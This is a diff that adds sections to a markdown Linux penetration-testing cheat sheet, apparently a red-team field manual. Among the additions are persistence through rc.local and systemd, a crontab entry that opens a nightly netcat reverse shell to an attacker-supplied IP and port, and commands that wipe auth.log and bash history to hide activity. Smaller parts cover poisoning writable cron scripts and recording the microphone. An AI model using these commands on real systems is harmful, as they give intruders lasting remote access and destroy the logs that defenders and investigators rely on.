@@ -1,9 +1,11 @@
+# LINUX Field Manual
 Do we have write permissions on cron jobs?
   - `/etc/crontab`
   - `/etc/cron.d`
   - `/var/spool/cron/crontabs/root`
 
-# LINUX BASICS
+Can you poison an existing script?
+
 ### Linux Basic Commands
 | Description | Basic Commands |
 |-------------|----------------|
@@ -276,3 +278,63 @@ Do we have write permissions on cron jobs?
 | List open services | `sdptool browse <INTERFACE_NAME>` |
 | Set as discoverable | `hciconfig <INTERFACE_NAME> name "<BLUETOOTH_NAME>" class 0x520204   piscan` |
 | Clear pand sessions | `pand –K` |
+
+## RC.LOCAL
+| Description | Command |
+|-------------|---------|
+| Add full path to rc.local file. This full path will be executed on system startup. | `nano /etc/rc.local` or `echo "<FILE_PATH>" >> /etc/rc.local` |
+
+## LINUX SERVICE
+| Description | Command |
+|-------------|---------|
+| Create/Open new service file using nano | `nano /etc/systemd/system/<SERVICE_NAME>.service` |
+| Add service information to file. <FILE_PATH> is full path to .sh file to execute on startup. When done, press CTRL+X, then press 'Y', then press 'Enter' to save and close the file with nano | Service file content:<br>`[Unit]`<br>`after=network.target`<br>`Description=My Service description`<br><br>`[Service]`<br>`Type=simple`<br>`Restart=always`<br>`ExecStart=<FILE_PATH>`<br><br>`[Install]`<br>`WantedBy=multi-user.target` |
+| Reload service manager | `systemctl daemon-reload` |
+| Enable the service | `systemctl enable <SERVICE_NAME>.service` |
+| Start the service persistence | `systemctl start <SERVICE_NAME>.service` |
+
+## CRONTAB
+| Description | Command |
+|-------------|---------|
+| Create cron that runs a Netcat reverse shell every day at midnight | Open new crontab: `crontab -e`<br>Add the following line at the end:<br>`0 0 * * * nc <ATTACKER_IP> <ATTACKER_PORT> -e /bin/sh` |
+| Create cron that runs a payload every day at midnight | Open new crontab: `crontab -e`<br>Add the following line at the end:<br>`0 0 * * * <FULLPATH>` |
+
+## MOUNT USB DEVICE
+| Description | Command |
+|-------------|---------|
+| List out potential devices to mount. Make note of the device path | `sudo fdisk -l` |
+| Create directory to mount to | `mkdir /media/myUSBDevice` |
+| Mount device to created directory | `mount <DEVICE_PATH> /media/myUSBDevice/` |
+| Run mount to show all mounted devices. See if USB device was mounted successfully | `mount | grep <DEVICE_PATH>` |
+| Unmount USB device | `umount -f /media/myUSBDevice` |
+
+## BASH HISTORY MANIPULATION
+| Description | Command |
+|-------------|---------|
+| Clear auth.log | `echo > /var/log/auth.log` |
+| Clear current user Bash history | `echo > ~/.bash_history` |
+| Delete .bash_history file | `rm ~/.bash_history -rf` |
+| Clear current session history | `history -c` |
+| Set history max lines to 0 | `export HISTFILESIZE=0` |
+| Set history max commands to 0 | `export HISTSIZE=0` |
+| Disable history logging (need to logout to take effect) | `unset HISTFILE` |
+| Kills current session | `kill -9 $$` |
+| Permanently send all Bash history commands to /dev/null | `ln -sf /dev/null ~/.bash_history` |
+
+## MISC COMMANDS
+| Description | Command |
+|-------------|---------|
+| List out audio devices | `arecord -L` |
+| Record microphone (one of the devices listed above) for 5 seconds to a file | `arecord -d 5 -D plughw <FILE_PATH>` |
+| Compile C program | `gcc <FILE_PATH> -c -o <OUTPUT_PATH>` |
+| Reboot/Shutdown | `init 6` / `init 0` |
+| Display log files | `cat /etc/*syslog*.conf | grep -v "^#"` |
+| Strip URL links out of a file | `cat <FILE_PATH> | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u` |
+| Scrape URL and write to a file | `wget http://<URL> -O <FILE_PATH> -o /dev/null` |
+| Start a remote desktop session with target IP | `rdesktop <IP_ADDRESS>` |
+| Log all shell activity. Session is written to file after session exit | `script -a <FILE_PATH>` |
+| Display user command history and then execute specific line in history | `history` / `!<LINE_NUMBER>` |
+| Background command and print all output from command to a file named .nohup | `nohup <COMMAND> &` |
+| Mount SMB share to /mnt/share folder | `mount.cifs //<IP_ADDRESS>/<SHARE_NAME> /mnt/share -o user=<USERNAME>,pass=<PASSWORD>,domain=<DOMAIN>,rw` |
+| Add another variable to the PATH | `export PATH="<PATH_TO_ADD>:$PATH"` |
+| Connect to Windows SMB Share | `smbclient -U <USERNAME> //<IP_ADDRESS>/<SHARE_NAME>` |
